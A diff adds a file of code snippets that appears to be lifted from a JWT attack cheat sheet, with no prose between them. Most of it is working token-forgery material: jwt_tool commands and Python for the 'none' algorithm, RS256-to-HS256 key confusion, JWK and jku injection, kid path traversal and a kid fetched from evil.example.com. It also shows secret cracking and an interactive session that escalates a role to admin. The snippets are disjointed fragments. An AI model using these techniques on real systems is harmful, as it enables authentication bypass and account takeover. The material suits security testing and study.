@@ -1,0 +1,106 @@
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header
+eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload
+UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature
+"typ": "JWT",
+"alg": "HS256"
+"sub":"1234567890",
+"name":"Amazing Haxx0r",
+"exp":"1466270722",
+"admin":true
+python3 jwt_tool.py JWT_HERE -X n
+{"alg":"HS256","typ":"JWT"}.
+{"sub":"1234567890","name":"John Doe","iat":1516239022}
+Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
+Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
+python3 jwt_tool.py [JWT_HERE] -X a
+import jwt
+jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
+decodedToken = jwt.decode(jwtToken, verify=False)
+noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)
+print(noneEncoded.decode())
+public = open('public.pem', 'r').read()
+print public
+print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
+python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
+$ cat key.pem | xxd -p | tr -d "\\n"
+2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
+$ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
+(stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
+python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
+[HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
+python3 jwt_tool.py [JWT_HERE] -X i
+"alg": "RS256",
+"jwk": {
+"kty": "RSA",
+"kid": "jwt_tool",
+"use": "sig",
+"e": "AQAB",
+"n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
+{"login":"admin"}.
+[Signed with new Private key; Public key injected]
+$ docker run -it ttervoort/jws2pubkey JWS1 JWS2
+$ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
+Computing public key. This may take a minute...
+{"kty": "RSA", "n": "sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ", "e": "AQAB"}
+jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
+jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds -T
+Token header values:
+[+] alg = "HS256"
+[+] typ = "JWT"
+Token payload values:
+[+] name = "John Doe"
+encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
+jwt.decode(encoded, 'secret', algorithms=['HS256'])
+python3 -m pip install termcolor cprint pycryptodomex requests
+python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
+Current value of role is: user
+Please enter new value and hit ENTER
+> admin
+[1] sub = 1234567890
+[2] role = admin
+[3] iat = 1516239022
+[0] Continue to next step
+Please select a field number (or 0 to Continue):
+> 0
+Token Signing:
+[1] Sign token with known key
+[2] Strip signature from token vulnerable to CVE-2015-2951
+[3] Sign with Public Key bypass vulnerability
+[4] Sign token with key file
+Please select an option from above (1-4):
+> 1
+Please enter the known key:
+> secret
+Please enter the key length:
+[1] HMAC-SHA256
+[2] HMAC-SHA384
+[3] HMAC-SHA512
+Your new forged token:
+[+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic
+[+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
+"alg": "HS256",
+"kid": "/root/res/keys/secret.key"
+"alg":"RS256",
+"typ":"JWT",
+"kid":"http://localhost:7070/privKey.key"
+// Example for HS256
+HMACSHA256(
+base64UrlEncode(header) + "." +
+base64UrlEncode(payload),
+your-256-bit-secret-from-secret.key
+>>> jwt.encode(
+...     {"some": "payload"},
+...     "secret",
+...     algorithm="HS256",
+...     headers={"kid": "http://evil.example.com/custom.key"},
+... )
+python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
+python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
+"keys": [
+"kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
+"n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
+python3 jwt_tool.py JWT_HERE -X s
+python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
+{"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json", "kid":"id_of_jwks"}.
+[Signed with new Private key; Public key exported]
